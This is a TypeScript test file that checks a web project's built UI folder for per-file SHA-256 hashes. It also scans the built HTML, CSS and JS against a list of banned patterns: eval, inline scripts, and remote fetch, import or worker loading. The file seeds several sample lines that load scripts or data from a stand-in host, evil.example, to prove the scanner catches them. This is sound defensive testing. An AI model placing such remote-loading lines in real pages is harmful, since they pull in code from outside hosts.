// TECHNICAL 18.2: the built ui/ is what the host serves: same-origin files only, nothing that runs from a string, a hash per file.
import { describe, expect, it } from "vitest";
import { execSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";

const root = join(__dirname, "..");
const ui = join(root, "..", "ui");

const walk = (d: string): string[] => readdirSync(d).flatMap((n) => (statSync(join(d, n)).isDirectory() ? walk(join(d, n)) : [join(d, n)]));
const newest = (paths: string[]) => Math.max(...paths.flatMap((p) => (existsSync(p) ? (statSync(p).isDirectory() ? walk(p) : [p]) : [])).map((f) => statSync(f).mtimeMs));

/** Builds when ui/ is missing or older than what it is built from (the sources and the lockfile; not the tests). */
function ensureBuilt() {
  const sums = join(ui, "SHA256SUMS");
  const sources = [join(root, "src"), join(root, "kit/index.ts"), join(root, "kit/styles"), join(root, "kit/parts"), join(root, "fake"), join(root, "index.html"),
    join(root, "vite.config.ts"), join(root, "scripts"), join(root, "package-lock.json")];
  const kitFiles = readdirSync(join(root, "kit")).filter((f) => /\.(ts|tsx)$/.test(f) && !/\.test\./.test(f)).map((f) => join(root, "kit", f));
  const srcFiles = walk(join(root, "src")).filter((f) => !/\.test\./.test(f));
  const fresh = existsSync(sums) && statSync(sums).mtimeMs >= newest([...sources.filter((s) => !s.endsWith("src")), ...kitFiles, ...srcFiles]);
  if (!fresh) execSync("npm run build", { cwd: root, stdio: "pipe" });
}

/** Strings that load nothing, by explicit list. */
const ALLOWED = ["http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml", "http://www.w3.org/1998/Math/MathML", "http://www.w3.org/1999/xlink",
  "http://www.w3.org/XML/1998/namespace", "http://www.w3.org/2000/xmlns/", "https://react.dev/errors/", "https://react.dev/link/"];
const ABS = String.raw`["'\`]\s*(?:https?:)?\/\/`;

type Kind = "html" | "css" | "js";
const COMMON: [string, RegExp][] = [
  ["eval(", /(?<![\w$])eval\s*\(/],
  ["new Function(", /new\s+Function\s*\(/],
  ["WebAssembly", /WebAssembly/],
  ["<iframe", /<iframe/i], ["<frame", /<frame/i], ["<object", /<object/i], ["<embed", /<embed/i],
];
const BY_KIND: Record<Kind, [string, RegExp][]> = {
  html: [
    ["inline script", /<script(?![^>]*\bsrc=)[^>]*>/i],
    ["script with content", /<script[^>]*\bsrc=[^>]*>\s*[^<\s]/i],
    ["inline event handler", /<[a-z][^>]*\son[a-z]+\s*=/i],
    ["absolute src/href", /\b(?:src|href)\s*=\s*["']?\s*(?:https?:)?\/\//i],
  ],
  css: [
    ["absolute url(", /url\(\s*["']?\s*(?:https?:)?\/\//i],
    ["absolute @import", /@import\s+(?:url\(\s*)?["']?\s*(?:https?:)?\/\//i],
  ],
  js: [
    ["import(", new RegExp(String.raw`\bimport\s*\(\s*${ABS}`)],
    ["from", new RegExp(String.raw`\bfrom\s*${ABS}`)],
    ["fetch(", new RegExp(String.raw`\bfetch\s*\(\s*${ABS}`)],
    ["new URL(", new RegExp(String.raw`new\s+URL\s*\(\s*${ABS}`)],
    ["new Worker(", new RegExp(String.raw`new\s+Worker\s*\(\s*${ABS}`)],
    ["importScripts(", new RegExp(String.raw`\bimportScripts\s*\(\s*${ABS}`)],
    ["WebSocket(", new RegExp(String.raw`\bWebSocket\s*\(\s*${ABS}`)],
    ["EventSource(", new RegExp(String.raw`\bEventSource\s*\(\s*${ABS}`)],
  ],
};

export function scan(kind: Kind, text: string): string[] {
  let t = text;
  for (const a of ALLOWED) t = t.split(a).join("ALLOWED");
  return [...COMMON, ...BY_KIND[kind]].filter(([, re]) => re.test(t)).map(([name]) => name);
}

const kindOf = (f: string): Kind | null => (f.endsWith(".html") ? "html" : f.endsWith(".css") ? "css" : f.endsWith(".js") ? "js" : null);

describe("the built ui/", () => {
  it("ac7_build_writes_the_page_its_assets_and_a_hash_per_file", () => {
    ensureBuilt();
    expect(existsSync(join(ui, "index.html"))).toBe(true);
    const files = walk(ui).map((f) => relative(ui, f).split("\\").join("/")).filter((f) => f !== "SHA256SUMS").sort();
    expect(files.some((f) => f.endsWith(".js"))).toBe(true);
    const lines = readFileSync(join(ui, "SHA256SUMS"), "utf8").trim().split("\n");
    expect(lines.map((l) => l.split("  ")[1])).toEqual(files);
    for (const l of lines) {
      const [h, f] = l.split("  ");
      expect(h).toBe(createHash("sha256").update(readFileSync(join(ui, f))).digest("hex"));
    }
  });

  it("ac7_built_files_pass_every_check", () => {
    ensureBuilt();
    const bad: string[] = [];
    for (const f of walk(ui)) {
      const k = kindOf(f);
      if (k) for (const v of scan(k, readFileSync(f, "utf8"))) bad.push(`${relative(ui, f)}: ${v}`);
    }
    expect(bad).toEqual([]);
  });

  it("ac7_the_page_has_one_html_file_with_same_origin_script_and_style", () => {
    ensureBuilt();
    expect(walk(ui).filter((f) => f.endsWith(".html"))).toHaveLength(1);
    const html = readFileSync(join(ui, "index.html"), "utf8");
    expect([...html.matchAll(/<script[^>]*\bsrc="([^"]+)"/g)].every((m) => m[1].startsWith("./") && existsSync(join(ui, m[1])))).toBe(true);
  });
});

describe("the checks themselves", () => {
  const seeds: [Kind, string, string][] = [
    ["html", "<script>run()</script>", "inline script"],
    ["html", '<script src="a.js">run()</script>', "script with content"],
    ["html", '<button onclick="x()">', "inline event handler"],
    ["html", '<script src="https://evil.example/a.js"></script>', "absolute src/href"],
    ["html", '<link rel="stylesheet" href="//evil.example/a.css">', "absolute src/href"],
    ["html", "<iframe src=a></iframe>", "<iframe"], ["html", "<frame src=a>", "<frame"],
    ["html", "<object data=a></object>", "<object"], ["html", "<embed src=a>", "<embed"],
    ["css", "a{background:url(https://evil.example/x.png)}", "absolute url("],
    ["css", '@import "https://evil.example/x.css";', "absolute @import"],
    ["css", "@import url(//evil.example/x.css);", "absolute @import"],
    ["js", 'x=eval("1")', "eval("], ["js", 'new Function("return 1")', "new Function("], ["js", "WebAssembly.instantiate(b)", "WebAssembly"],
    ["js", 'import("https://evil.example/m.js")', "import("], ["js", 'import x from"https://evil.example/m.js"', "from"],
    ["js", 'fetch("https://evil.example")', "fetch("], ["js", 'new URL("//evil.example")', "new URL("],
    ["js", 'new Worker("https://evil.example/w.js")', "new Worker("], ["js", 'importScripts("https://evil.example/w.js")', "importScripts("],
    ["js", 'new WebSocket("wss://x")'.replace("wss:", "https:"), "WebSocket("], ["js", 'new EventSource("https://evil.example")', "EventSource("],
  ];
  for (const [kind, text, name] of seeds) {
    it(`ac7_seeded_bad_file_is_caught: ${name} in ${kind}`, () => { expect(scan(kind, text)).toContain(name); });
  }

  it("ac7_strings_that_load_nothing_pass", () => {
    expect(scan("js", 'a.setAttribute("xmlns","http://www.w3.org/2000/svg");throw Error("https://react.dev/errors/"+n)')).toEqual([]);
    expect(scan("html", '<script type="module" crossorigin src="./assets/a.js"></script><link href="./assets/a.css">')).toEqual([]);
  });
});
